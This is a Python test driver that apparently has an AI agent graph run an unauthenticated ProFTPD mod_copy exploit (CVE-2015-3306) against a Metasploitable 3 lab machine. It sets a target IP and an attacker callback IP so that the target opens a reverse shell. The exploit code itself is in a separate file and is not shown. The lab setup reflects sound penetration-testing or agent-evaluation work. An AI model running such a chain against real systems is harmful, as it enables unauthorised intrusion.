"""
Live test driver for examples/proftpd_modcopy_graph.py.

Unauthenticated FTP exploitation chain against Metasploitable 3's
ProFTPD 1.3.5 on port 21 (CVE-2015-3306 mod_copy). Expected to land
a low-privilege www-data shell.
"""

from __future__ import annotations

import os
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from core_agents.orchestrator import run_graph
from examples.proftpd_modcopy_graph import build_proftpd_modcopy_graph

# LHOST is the address the TARGET dials back to for the reverse shell. In the
# container lab this is the VirtualBox host-only adapter (192.168.34.1), which
# Docker publishes into the Kali container; override via the LHOST env var.
TARGET_IP = os.getenv("TARGET_IP", "192.168.34.7")
ATTACKER_IP = os.getenv("LHOST", "192.168.34.6")

if __name__ == "__main__":
    graph = build_proftpd_modcopy_graph(target_ip=TARGET_IP, attacker_ip=ATTACKER_IP)
    print(f"Loaded graph: {graph.name}  ({len(graph.nodes)} nodes, {len(graph.edges)} edges)")
    print(f"Running with explore=True, use_judge=True against {TARGET_IP}...")
    run_graph(graph, explore=True, use_judge=True)
